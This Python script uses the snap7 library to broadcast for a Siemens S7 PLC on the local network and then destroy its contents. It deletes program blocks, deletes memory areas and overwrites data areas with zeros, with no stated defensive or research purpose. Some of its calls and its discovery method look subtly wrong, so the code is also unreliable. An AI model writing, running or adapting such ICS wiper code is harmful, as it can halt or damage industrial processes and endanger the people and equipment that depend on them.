from snap7 import client
import socket
import struct

def find_plc_ip():
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("", 0))
    sock.settimeout(1)

    # Send a broadcast message to the network
    message = b"Hello, PLC!"
    sock.sendto(message, ("255.255.255.255", 102))

    # Listen for responses
    try:
        data, addr = sock.recvfrom(1024)
        return addr[0]
    except socket.timeout:
        return None

def data_destruction(plc_ip):
    # Create a client object
    plc = client.Client()
    
    # Try to connect to the PLC
    try:
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 for S7-1200
    except Exception as e:
        print(f"Failed to connect to PLC: {e}")
        return
    
    # Perform data destruction
    try:
        # Delete all blocks in the PLC
        for block_type in [0x01, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F]:
            for block_num in range(1, 100):
                try:
                    plc.delete_block(block_type, block_num)
                except Exception as e:
                    print(f"Failed to delete block {block_type:x}/{block_num}: {e}")
        
        # Delete all data in the PLC's memory
        for area in [0x81, 0x82, 0x83, 0x84]:
            for db_num in range(1, 100):
                try:
                    plc.delete_area(area, db_num)
                except Exception as e:
                    print(f"Failed to delete area {area:x}/{db_num}: {e}")
        
        # Overwrite all data in the PLC's memory with zeros
        for area in [0x81, 0x82, 0x83, 0x84]:
            for db_num in range(1, 100):
                try:
                    data = b'\x00' * 1024
                    plc.write_area(area, db_num, 0, data)
                except Exception as e:
                    print(f"Failed to overwrite area {area:x}/{db_num}: {e}")
        
        print("Data destruction complete.")
    except Exception as e:
        print(f"Failed to perform data destruction: {e}")
    finally:
        # Always disconnect when you're done
        plc.disconnect()

def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"Found PLC at IP address: {plc_ip}")
        
        # Perform data destruction
        data_destruction(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()